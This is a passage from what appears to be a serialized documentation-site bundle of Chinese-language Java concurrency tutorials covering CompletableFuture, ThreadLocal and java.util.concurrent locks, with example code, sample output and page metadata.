CompletableFuture\n\n它就是用来解决Future方法的要么阻塞，要么轮询判断的问题\n\n因为是为了对这个线程的结果进行处理，原先的方式都是判断是否有结果了，或者直接等待到结果返回\n\n这样效率非常的低\n\nCompletableFuture的解决方案是直接给一个回调函数，线程执行完了让它自己去调用，而不需要主线程去处理了\n\n//设置线程任务\nCompletableFuture<String> scf = CompletableFuture.supplyAsync(() -> {\n    return "hello";\n});\n//设置成功返回的结果\nscf.thenAccept((result)->{\n    System.out.println(result);\n});\n//设置异常的情况的处理\nscf.exceptionally((e)->{\n    e.printStackTrace();\n    return null;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n运行结果：\n\n> hello\n\n\n# CompletableFuture还支持同一个线程串行操作\n\n使用thenApplyAsync函数，传入回调函数，回调函数的参数是之前的任务返回的结果\n\nCompletableFuture<String> scf = CompletableFuture.supplyAsync(() -> {\n    return "hello";\n});\nscf = scf.thenApplyAsync((str)->{\n    return str+" CompletableFuture";\n});\n//设置成功返回的结果\nscf.thenAccept((result)->{\n    System.out.println(result);\n});\n//设置异常的情况的处理\nscf.exceptionally((e)->{\n    e.printStackTrace();\n    return null;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n运行结果\n\n> hello CompletableFuture\n\n但是，如果这段代码\n\nscf = scf.thenApplyAsync((str)->{\n    return str+" CompletableFuture";\n});\n\n\n1\n2\n3\n\n\n不给scf重新赋值，结果依然是hello\n\n也就是\n\nCompletableFuture<String> scf = CompletableFuture.supplyAsync(() -> {\n    return "hello";\n});\nscf.thenApplyAsync((str)->{\n    return str+" CompletableFuture";\n});\n//设置成功返回的结果\nscf.thenAccept((result)->{\n    System.out.println(result);\n});\n//设置异常的情况的处理\nscf.exceptionally((e)->{\n    e.printStackTrace();\n    return null;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n运行结果:\n\n> hello\n\n这是因为\n\nscf.thenApplyAsync((str)->{\n    return str+" CompletableFuture";\n});\n\n\n1\n2\n3\n\n\n这个函数的返回结果是另外一个对象，thenAccept是给原先的那个对象设置的，所以新的对象执行完相关的函数之后是没有回调函数的\n\n\n# CompletableFuture还支持多个线程并行操作\n\n使用anyOf函数，将多个CompletableFuture对象合成一个\n\n可以实现“任意个CompletableFuture只要一个成功”\n\n//设置线程任务\nCompletableFuture<String> scfHello = CompletableFuture.supplyAsync(() -> {\n    try {\n        Thread.sleep(1000);\n    } catch (InterruptedException e) {\n        e.printStackTrace();\n    }\n    return "hello";\n});\nCompletableFuture<String> scfHi = CompletableFuture.supplyAsync(() -> {\n    return "hi";\n});\nCompletableFuture<Object> scf = CompletableFuture.anyOf(scfHello, scfHi);\nscf = scf.thenApplyAsync((str)->{\n    return str+" CompletableFuture";\n});\n//设置成功返回的结果\nscf.thenAccept((result)->{\n    System.out.println(result);\n});\n//设置异常的情况的处理\nscf.exceptionally((e)->{\n    e.printStackTrace();\n    return null;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n运行结果：\n\n> hi CompletableFuture\n\n还可以使用allOf()实现“所有CompletableFuture都必须成功”',normalizedContent:'java 多线程的基本使用\n\n\n# future\n\nfuture<v>接口表示一个未来可能会返回的结果，它定义的方法有：\n\n * get()：获取结果（可能会等待）\n * get(long timeout, timeunit unit)：获取结果，但只等待指定的时间；\n * cancel(boolean mayinterruptifrunning)：取消当前任务；\n * isdone()：判断任务是否已完成。\n\nexecutorservice.submit()方法如果传入callable对象，那么就可以返回一个future对象，再调用一个get()方法就可以得到相应的结果,单说get()方法会导致阻塞，所以如果不想阻塞，只能通过isdone()去判断\n\nexecutorservice es = executors.newfixedthreadpool(5);\nfuture<string> futurestring = es.submit(() -> {\n    thread.sleep(3000);\n    return "hello";\n});\nsystem.out.println(futurestring.get());//会阻塞到相应的线程执行完毕\nes.shutdown();\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# completablefuture\n\n它就是用来解决future方法的要么阻塞，要么轮询判断的问题\n\n因为是为了对这个线程的结果进行处理，原先的方式都是判断是否有结果了，或者直接等待到结果返回\n\n这样效率非常的低\n\ncompletablefuture的解决方案是直接给一个回调函数，线程执行完了让它自己去调用，而不需要主线程去处理了\n\n//设置线程任务\ncompletablefuture<string> scf = completablefuture.supplyasync(() -> {\n    return "hello";\n});\n//设置成功返回的结果\nscf.thenaccept((result)->{\n    system.out.println(result);\n});\n//设置异常的情况的处理\nscf.exceptionally((e)->{\n    e.printstacktrace();\n    return null;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n运行结果：\n\n> hello\n\n\n# completablefuture还支持同一个线程串行操作\n\n使用thenapplyasync函数，传入回调函数，回调函数的参数是之前的任务返回的结果\n\ncompletablefuture<string> scf = completablefuture.supplyasync(() -> {\n    return "hello";\n});\nscf = scf.thenapplyasync((str)->{\n    return str+" completablefuture";\n});\n//设置成功返回的结果\nscf.thenaccept((result)->{\n    system.out.println(result);\n});\n//设置异常的情况的处理\nscf.exceptionally((e)->{\n    e.printstacktrace();\n    return null;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n运行结果\n\n> hello completablefuture\n\n但是，如果这段代码\n\nscf = scf.thenapplyasync((str)->{\n    return str+" completablefuture";\n});\n\n\n1\n2\n3\n\n\n不给scf重新赋值，结果依然是hello\n\n也就是\n\ncompletablefuture<string> scf = completablefuture.supplyasync(() -> {\n    return "hello";\n});\nscf.thenapplyasync((str)->{\n    return str+" completablefuture";\n});\n//设置成功返回的结果\nscf.thenaccept((result)->{\n    system.out.println(result);\n});\n//设置异常的情况的处理\nscf.exceptionally((e)->{\n    e.printstacktrace();\n    return null;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n运行结果:\n\n> hello\n\n这是因为\n\nscf.thenapplyasync((str)->{\n    return str+" completablefuture";\n});\n\n\n1\n2\n3\n\n\n这个函数的返回结果是另外一个对象，thenaccept是给原先的那个对象设置的，所以新的对象执行完相关的函数之后是没有回调函数的\n\n\n# completablefuture还支持多个线程并行操作\n\n使用anyof函数，将多个completablefuture对象合成一个\n\n可以实现“任意个completablefuture只要一个成功”\n\n//设置线程任务\ncompletablefuture<string> scfhello = completablefuture.supplyasync(() -> {\n    try {\n        thread.sleep(1000);\n    } catch (interruptedexception e) {\n        e.printstacktrace();\n    }\n    return "hello";\n});\ncompletablefuture<string> scfhi = completablefuture.supplyasync(() -> {\n    return "hi";\n});\ncompletablefuture<object> scf = completablefuture.anyof(scfhello, scfhi);\nscf = scf.thenapplyasync((str)->{\n    return str+" completablefuture";\n});\n//设置成功返回的结果\nscf.thenaccept((result)->{\n    system.out.println(result);\n});\n//设置异常的情况的处理\nscf.exceptionally((e)->{\n    e.printstacktrace();\n    return null;\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n运行结果：\n\n> hi completablefuture\n\n还可以使用allof()实现“所有completablefuture都必须成功”',charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java 多线程 Threadlocal",frontmatter:{title:"java 多线程 Threadlocal",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/3f210f/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/04.java%20%E5%A4%9A%E7%BA%BF%E7%A8%8B%20Threadlocal.html",relativePath:"04.java/03.多线程/04.java 多线程 Threadlocal.md",key:"v-459d5a6f",path:"/pages/3f210f/",headersStr:null,content:"java 多线程的基本使用\n\nThreadLocal相当于是一个Map<Thread,Object>\n\n他的作用就是给当前的线程绑定一个对象\n\n//一个javabean\nclass User{\n    private String name;\n    private String phone;\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getPhone() {\n        return phone;\n    }\n\n    public void setPhone(String phone) {\n        this.phone = phone;\n    }\n\n    public User(String name, String phone) {\n        this.name = name;\n        this.phone = phone;\n    }\n\n    public User() {\n    }\n\n    @Override\n    public String toString() {\n        return \"User{\" +\n                \"name='\" + name + '\\'' +\n                \", phone='\" + phone + '\\'' +\n                '}';\n    }\n}\n\n//main和新的线程访问的是同一个ThreadLocal对象\npublic class ThreadLocalTest {\n    static ThreadLocal<User> userThreadLocal = new ThreadLocal<>();//初始化userThread\n    public static void main(String[] args) {\n        new Thread(()->{\n            User xiaoming = new User(\"小明\", \"123456\");\n            userThreadLocal.set(xiaoming);//设置变量\n            speak();\n            userThreadLocal.remove();\n        }).start();\n        System.out.println(Thread.currentThread().getName()+\"---\x3e\"+userThreadLocal.get());//获取\n    }\n\n    private static void speak(){\n        System.out.println(Thread.currentThread().getName()+\"---\x3e\"+userThreadLocal.get());//获取\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n运行结果：\n\n> main---\x3enull Thread-0---\x3eUser{name='小明', phone='123456'}\n\n只有添加了变量的线程才能获得，没有添加的只能获得Null\n\nmain和新的线程访问的是同一个ThreadLocal对象\n\nThreadLocal.remove()用于删除添加到线程的变量，因为如果采用线程池，会复用线程，如果不去掉对象，可能会被获得",normalizedContent:"java 多线程的基本使用\n\nthreadlocal相当于是一个map<thread,object>\n\n他的作用就是给当前的线程绑定一个对象\n\n//一个javabean\nclass user{\n    private string name;\n    private string phone;\n\n    public string getname() {\n        return name;\n    }\n\n    public void setname(string name) {\n        this.name = name;\n    }\n\n    public string getphone() {\n        return phone;\n    }\n\n    public void setphone(string phone) {\n        this.phone = phone;\n    }\n\n    public user(string name, string phone) {\n        this.name = name;\n        this.phone = phone;\n    }\n\n    public user() {\n    }\n\n    @override\n    public string tostring() {\n        return \"user{\" +\n                \"name='\" + name + '\\'' +\n                \", phone='\" + phone + '\\'' +\n                '}';\n    }\n}\n\n//main和新的线程访问的是同一个threadlocal对象\npublic class threadlocaltest {\n    static threadlocal<user> userthreadlocal = new threadlocal<>();//初始化userthread\n    public static void main(string[] args) {\n        new thread(()->{\n            user xiaoming = new user(\"小明\", \"123456\");\n            userthreadlocal.set(xiaoming);//设置变量\n            speak();\n            userthreadlocal.remove();\n        }).start();\n        system.out.println(thread.currentthread().getname()+\"---\x3e\"+userthreadlocal.get());//获取\n    }\n\n    private static void speak(){\n        system.out.println(thread.currentthread().getname()+\"---\x3e\"+userthreadlocal.get());//获取\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n运行结果：\n\n> main---\x3enull thread-0---\x3euser{name='小明', phone='123456'}\n\n只有添加了变量的线程才能获得，没有添加的只能获得null\n\nmain和新的线程访问的是同一个threadlocal对象\n\nthreadlocal.remove()用于删除添加到线程的变量，因为如果采用线程池，会复用线程，如果不去掉对象，可能会被获得",charsets:{cjk:!0},lastUpdated:"2022/04/18, 00:47:23",lastUpdatedTimestamp:1650214043e3},{title:"java JUC包实现多线程",frontmatter:{title:"java JUC包实现多线程",date:"2022-04-17T23:33:06.000Z",permalink:"/pages/e50b43/",categories:["java","多线程"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/04.java/03.%E5%A4%9A%E7%BA%BF%E7%A8%8B/05.java%20JUC%E5%8C%85%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B.html",relativePath:"04.java/03.多线程/05.java JUC包实现多线程.md",key:"v-38ec4099",path:"/pages/e50b43/",headers:[{level:2,title:"ReentrantLock：用来替代Synchronized",slug:"reentrantlock-用来替代synchronized",normalizedTitle:"reentrantlock：用来替代synchronized",charIndex:66},{level:2,title:"Condition关键字：用来替代wait()和notify()函数",slug:"condition关键字-用来替代wait-和notify-函数",normalizedTitle:"condition关键字：用来替代wait()和notify()函数",charIndex:3234},{level:2,title:"ReadWriteLock",slug:"readwritelock",normalizedTitle:"readwritelock",charIndex:6192},{level:2,title:"StampedLock",slug:"stampedlock",normalizedTitle:"stampedlock",charIndex:7029}],headersStr:"ReentrantLock：用来替代Synchronized Condition关键字：用来替代wait()和notify()函数 ReadWriteLock StampedLock",content:'更加基础的使用： java 多线程的基本使用 JUC指的就是java.util.concurrent这个包，用于多线程开发\n\n\n# ReentrantLock：用来替代Synchronized\n\n同一个时间只能有一个线程访问临界区，无论读写\n\n用来替代synchroized关键字，使用方法\n\n 1. 创建一个ReentrantLock变量reentrantLock\n 2. 然后在需要同步的代码段上下加上reentrantLock.lock()和reentrantLock.unlock()\n\npackage kehao.thread.juc.lock;\n/*\n* 用来代替synchronized\n* */\n\nimport java.lang.reflect.Array;\nimport java.util.ArrayList;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class ReentrantLockTest{\n    private int count = 0;\n    private final Lock lock = new ReentrantLock();\n\n    public void funWithoutSync(){\n        for (int i = 0; i < 10000; i++) {\n            count = count + 1;\n            count = count - 1;\n        }\n    }\n\n    public void funSynchronized(){\n        synchronized (this) {\n            for (int i = 0; i < 10000; i++) {\n                count = count + 1;\n                count = count - 1;\n            }\n        }\n    }\n\n    public void funReentrantLock(){\n        lock.lock();\n        for (int i = 0; i < 10000; i++) {\n            count = count + 1;\n            count = count - 1;\n        }\n        lock.unlock();\n    }\n\n\n    public int getCount(){\n        return count;\n    }\n\n    public void setCount(int count){\n        this.count = count;\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        ReentrantLockTest reentrantLockTest = new ReentrantLockTest();\n        \n        //不使用同步\n        reentrantLockTest.setCount(0);\n        ArrayList<Thread> threads = new ArrayList<>();\n        for (int i = 0; i < 5; i++) {\n            Thread thread = new Thread(()->{\n                reentrantLockTest.funWithoutSync();\n            });\n            threads.add(thread);\n            thread.start();\n        }\n        for (Thread t:threads) {\n            t.join();\n        }\n        System.out.println("without synchronzied  ---\x3e"+reentrantLockTest.getCount());\n\n        //使用synchronized关键字同步\n        reentrantLockTest.setCount(0);\n        threads.clear();\n        for (int i = 0; i < 5; i++) {\n            Thread thread = new Thread(()->{\n                reentrantLockTest.funSynchronized();\n            });\n            threads.add(thread);\n            thread.start();\n        }\n        for (Thread t:threads) {\n            t.join();\n        }\n        System.out.println("synchronized   ---\x3e"+reentrantLockTest.getCount());\n\n        //使用ReentrantLock进行同步\n        reentrantLockTest.setCount(0);\n        threads.clear();\n        for (int i = 0; i < 5; i++) {\n            Thread thread = new Thread(()->{\n                reentrantLockTest.funReentrantLock();\n            });\n            threads.add(thread);\n            thread.start();\n        }\n        for (Thread t:threads) {\n            t.join();\n        }\n        System.out.println("ReentrantLock   ---\x3e"+reentrantLockTest.getCount());\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n\n\n运行结果：\n\n> without synchronzied  ---\x3e1\n> synchronized   ---\x3e0\n> ReentrantLock   ---\x3e0\n> \n> \n> 1\n> 2\n> 3\n\n\n# Condition关键字：用来替代wait()和notify()函数\n\n在使用ReentrantLock的时候因为没有synchroized包裹住的锁对象，无法调用wait和notify函数，所以需要用Condition来替代\n\n而且Condition相较于原生的wait和notify函数有天生的优势，是通过阻塞队列实现，而非与系统进行交互，性能更加好\n\n每一个Condition对象相当于是一个阻塞队列，所以就可以针对具体的阻塞队列进行唤醒线程，而避免使用notifyAll()，因为使用notifyAll()，唤醒了该锁对象的所有线程，并不一定是所需要的线程，而且被唤醒的多个线程不一定都能得到锁对象从而进入临界区，所以需要通过循环来不断的判断，一个线程可能会休眠唤醒休眠唤醒多次，才能获得锁对象，导致效率低下\n\n在编码的时候不同类型的线程可以在阻塞的时候放入不同的阻塞队列更易于管理\n\nCondition.await()相当于是添加到阻塞队列\n\nCondition.signal()相当于是阻塞队列第一个元素出队\n\npackage kehao.thread.juc.lock;\n\nimport java.util.concurrent.locks.Condition;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\nclass Patient implements Runnable {\n    //生病 生病后唤醒医生给病人治病\n\n    public void ill() {\n        Hospital.lock.lock();\n        Hospital.patientNumber++;\n        System.out.println("get cold  ---\x3e" + Hospital.patientNumber);\n        Hospital.treatCondition.signal();\n        Hospital.lock.unlock();\n    }\n\n    @Override\n    public void run() {\n        ill();\n    }\n}\n\nclass Doctor implements Runnable {\n    //治疗 如果没有病人就等待 如果有就被唤醒 给人治病\n    public void treat() {\n        Hospital.lock.lock();\n        if (Hospital.patientNumber <= 0) {\n            try {\n                Hospital.treatCondition.await();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        Hospital.patientNumber--;\n        System.out.println("drink more hot water  ---\x3e" + Hospital.patientNumber);\n        Hospital.lock.unlock();\n    }\n\n    @Override\n    public void run() {\n        treat();\n    }\n}\n\nclass Hospital {\n    public static int patientNumber = 0;\n    public static final Lock lock = new ReentrantLock();\n    public static final Condition illCondition = lock.newCondition();//病人阻塞队列\n    public static final Condition treatCondition = lock.newCondition();//医生阻塞队列\n}\n\n\npublic class ConditionTest {\n    public static void main(String[] args) {\n        Patient patient = new Patient();\n        Doctor doctor = new Doctor();\n\n        for (int i = 0; i < 10; i++) {\n            new Thread(doctor).start();\n        }\n\n        for (int i = 0; i < 10; i++) {\n            new Thread(patient).start();\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n运行结果：\n\n> get cold  ---\x3e1\n> drink more hot water  ---\x3e0\n> get cold  ---\x3e1\n> get cold  ---\x3e2\n> get cold  ---\x3e3\n> drink more hot water  ---\x3e2\n> drink more hot water  ---\x3e1\n> get cold  ---\x3e2\n> get cold  ---\x3e3\n> drink more hot water  ---\x3e2\n> get cold  ---\x3e3\n> drink more hot water  ---\x3e2\n> get cold  ---\x3e3\n> get cold  ---\x3e4\n> drink more hot water  ---\x3e3\n> drink more hot water  ---\x3e2\n> get cold  ---\x3e3\n> drink more hot water  ---\x3e2\n> drink more hot water  ---\x3e1\n> drink more hot water  ---\x3e0\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> 9\n> 10\n> 11\n> 12\n> 13\n> 14\n> 15\n> 16\n> 17\n> 18\n> 19\n> 20\n\n\n# ReadWriteLock\n\n可以同时读，但读和写，写和写不能并行，提高了效率\n\n使用方法：\n\n 1. 获得ReadWriteLock\n 2. 获得readLock\n 3. 获得writeLock\n 4. 在需要写的地方加写锁\n 5. 在需要读的时候加读锁\n\npublic class ReadWriteLockTest {\n    private final ReadWriteLock readWriteLock = new ReentrantReadWriteLock();\n    private final Lock readLock = readWriteLock.readLock();//\n    private final Lock writeLock = readWriteLock.writeLock();\n    private int count = 0;\n    \n    public void add(){\n        writeLock.lock();//加写锁\n        count = count +1;\n        writeLock.unlock();//解写锁\n    }\n    \n    private int getCount(){\n        readLock.lock();//加读锁\n        int returnCount = count;\n        readLock.unlock();//解读锁\n        return returnCount;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n那么问题来了，既然希望读能够并发，为什么对于读还需要加锁呢？\n\n这是为了让读和写不能并行，如果读不加锁，写的时候就不会在检测时候检测到没有读锁，从而获取完写锁直接就进行修改，导致了读和写同时进入临界区\n\n\n# StampedLock\n\nStampedLock和ReadWriteLock相比，改进之处在于：读的过程中也允许获取写锁后写入！这样一来，我们读的数据就可能不一致，所以，需要一点额外的代码来判断读的过程中是否有写入，这种读锁是一种乐观锁。\n\n//摘自廖雪峰老师Java课程的代码\npublic class Point {\n    private final StampedLock stampedLock = new StampedLock();\n\n    private double x;\n    private double y;\n\n    public void move(double deltaX, double deltaY) {\n        long stamp = stampedLock.writeLock(); // 获取写锁\n        try {\n            x += deltaX;\n            y += deltaY;\n        } finally {\n            stampedLock.unlockWrite(stamp); // 释放写锁\n        }\n    }\n\n    public double distanceFromOrigin() {\n        long stamp = stampedLock.tryOptimisticRead(); // 获得一个乐观读锁\n        // 注意下面两行代码不是原子操作\n        // 假设x,y = (100,200)\n        double currentX = x;\n        // 此处已读取到x=100，但x,y可能被写线程修改为(300,400)\n        double currentY = y;\n        // 此处已读取到y，如果没有写入，读取是正确的(100,200)\n        // 如果有写入，读取是错误的(100,400)\n        if (!stampedLock.validate(stamp)) { // 检查乐观读锁后是否有其他写锁发生\n            stamp = stampedLock.readLock(); // 获取一个悲观读锁\n            try {\n                currentX = x;\n                currentY = y;\n            } finally {\n                stampedLock.unlockRead(stamp); // 释放悲观读锁\n            }\n        }\n        return Math.sqrt(currentX * currentX + currentY * currentY);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n',normalizedContent:'更加基础的使用： java 多线程的基本使用 juc指的就是java.util.concurrent这个包，用于多线程开发\n\n\n# reentrantlock：用来替代synchronized\n\n同一个时间只能有一个线程访问临界区，无论读写\n\n用来替代synchroized关键字，使用方法\n\n 1. 创建一个reentrantlock变量reentrantlock\n 2. 然后在需要同步的代码段上下加上reentrantlock.lock()和reentrantlock.unlock()\n\npackage kehao.thread.juc.lock;\n/*\n* 用来代替synchronized\n* */\n\nimport java.lang.reflect.array;\nimport java.util.arraylist;\nimport java.util.concurrent.locks.lock;\nimport java.util.concurrent.locks.reentrantlock;\n\npublic class reentrantlocktest{\n    private int count = 0;\n    private final lock lock = new reentrantlock();\n\n    public void funwithoutsync(){\n        for (int i = 0; i < 10000; i++) {\n            count = count + 1;\n            count = count - 1;\n        }\n    }\n\n    public void funsynchronized(){\n        synchronized (this) {\n            for (int i = 0; i < 10000; i++) {\n                count = count + 1;\n                count = count - 1;\n            }\n        }\n    }\n\n    public void funreentrantlock(){\n        lock.lock();\n        for (int i = 0; i < 10000; i++) {\n            count = count + 1;\n            count = count - 1;\n        }\n        lock.unlock();\n    }\n\n\n    public int getcount(){\n        return count;\n    }\n\n    public void setcount(int count){\n        this.count = count;\n    }\n\n    public static void main(string[] args) throws interruptedexception {\n        reentrantlocktest reentrantlocktest = new reentrantlocktest();\n        \n        //不使用同步\n        reentrantlocktest.setcount(0);\n        arraylist<thread> threads = new arraylist<>();\n        for (int i = 0; i < 5; i++) {\n            thread thread = new thread(()->{\n                reentrantlocktest.funwithoutsync();\n            });\n            threads.add(thread);\n            thread.start();\n        }\n        for (thread t:threads) {\n            t.join();\n        }\n        system.out.println("without synchronzied  ---\x3e"+reentrantlocktest.getcount());\n\n        //使用synchronized关键字同步\n        reentrantlocktest.setcount(0);\n        threads.clear();\n        for (int i = 0; i < 5; i++) {\n            thread thread = new thread(()->{\n                reentrantlocktest.funsynchronized();\n            });\n            threads.add(thread);\n            thread.start();\n        }\n        for (thread t:threads) {\n            t.join();\n        }\n        system.out.println("synchronized   ---\x3e"+reentrantlocktest.getcount());\n\n        //使用reentrantlock进行同步\n        reentrantlocktest.setcount(0);\n        threads.clear();\n        for (int i = 0; i < 5; i++) {\n            thread thread = new thread(()->{\n                reentrantlocktest.funreentrantlock();\n            });\n            threads.add(thread);\n            thread.start();\n        }\n        for (thread t:threads) {\n            t.join();\n        }\n        system.out.println("reentrantlock   ---\x3e"+reentrantlocktest.getcount());\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n\n\n运行结果：\n\n> without synchronzied  ---\x3e1\n> synchronized   ---\x3e0\n> reentrantlock   ---\x3e0\n> \n> \n> 1\n> 2\n> 3\n\n\n# condition关键字：用来替代wait()和notify()函数\n\n在使用reentrantlock的时候因为没有synchroized包裹住的锁对象，无法调用wait和notify函数，所以需要用condition来替代\n\n而且condition相较于原生的wait和notify函数有天生的优势，是通过阻塞队列实现，而非与系统进行交互，性能更加好\n\n每一个condition对象相当于是一个阻塞队列，所以就可以针对具体的阻塞队列进行唤醒线程，而避免使用notifyall()，因为使用notifyall()，唤醒了该锁对象的所有线程，并不一定是所需要的线程，而且被唤醒的多个线程不一定都能得到锁对象从而进入临界区，所以需要通过循环来不断的判断，一个线程可能会休眠唤醒休眠唤醒多次，才能获得锁对象，导致效率低下\n\n在编码的时候不同类型的线程可以在阻塞的时候放入不同的阻塞队列更易于管理\n\ncondition.await()相当于是添加到阻塞队列\n\ncondition.signal()相当于是阻塞队列第一个元素出队\n\npackage kehao.thread.juc.lock;\n\nimport java.util.concurrent.locks.condition;\nimport java.util.concurrent.locks.lock;\nimport java.util.concurrent.locks.reentrantlock;\n\nclass patient implements runnable {\n    //生病 生病后唤醒医生给病人治病\n\n    public void ill() {\n        hospital.lock.lock();\n        hospital.patientnumber++;\n        system.out.println("get cold  ---\x3e" + hospital.patientnumber);\n        hospital.treatcondition.signal();\n        hospital.lock.unlock();\n    }\n\n    @override\n    public void run() {\n        ill();\n    }\n}\n\nclass doctor implements runnable {\n    //治疗 如果没有病人就等待 如果有就被唤醒 给人治病\n    public void treat() {\n        hospital.lock.lock();\n        if (hospital.patientnumber <= 0) {\n            try {\n                hospital.treatcondition.await();\n            } catch (interruptedexception e) {\n                e.printstacktrace();\n            }\n        }\n        hospital.patientnumber--;\n        system.out.println("drink more hot water  ---\x3e" + hospital.patientnumber);\n        hospital.lock.unlock();\n    }\n\n    @override\n    public void run() {\n        treat();\n    }\n}\n\nclass hospital {\n    public static int patientnumber = 0;\n    public static final lock lock = new reentrantlock();\n    public static final condition illcondition = lock.newcondition();//病人阻塞队列\n    public static final condition treatcondition = lock.newcondition();//医生阻塞队列\n}\n\n\npublic class conditiontest {\n    public static void main(string[] args) {\n        patient patient = new patient();\n        doctor doctor = new doctor();\n\n        for (int i = 0; i < 10; i++) {\n            new thread(doctor).start();\n        }\n\n        for (int i = 0; i < 10; i++) {\n            new thread(patient).start();\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n运行结果：\n\n> get cold  ---\x3e1\n> drink more hot water  ---\x3e0\n> get cold  ---\x3e1\n> get cold  ---\x3e2\n> get cold  ---\x3e3\n> drink more hot water  ---\x3e2\n> drink more hot water  ---\x3e1\n> get cold  ---\x3e2\n> get cold  ---\x3e3\n> drink more hot water  ---\x3e2\n> get cold  ---\x3e3\n> drink more hot water  ---\x3e2\n> get cold  ---\x3e3\n> get cold  ---\x3e4\n> drink more hot water  ---\x3e3\n> drink more hot water  ---\x3e2\n> get cold  ---\x3e3\n> drink more hot water  ---\x3e2\n> drink more hot water  ---\x3e1\n> drink more hot water  ---\x3e0\n> \n> \n> 1\n> 2\n> 3\n> 4\n> 5\n> 6\n> 7\n> 8\n> 9\n> 10\n> 11\n> 12\n> 13\n> 14\n> 15\n> 16\n> 17\n> 18\n> 19\n> 20\n\n\n# readwritelock\n\n可以同时读，但读和写，写和写不能并行，提高了效率\n\n使用方法：\n\n 1. 获得readwritelock\n 2. 获得readlock\n 3. 获得writelock\n 4. 在需要写的地方加写锁\n 5. 在需要读的时候加读锁\n\npublic class readwritelocktest {\n    private final readwritelock readwritelock = new reentrantreadwritelock();\n    private final lock readlock 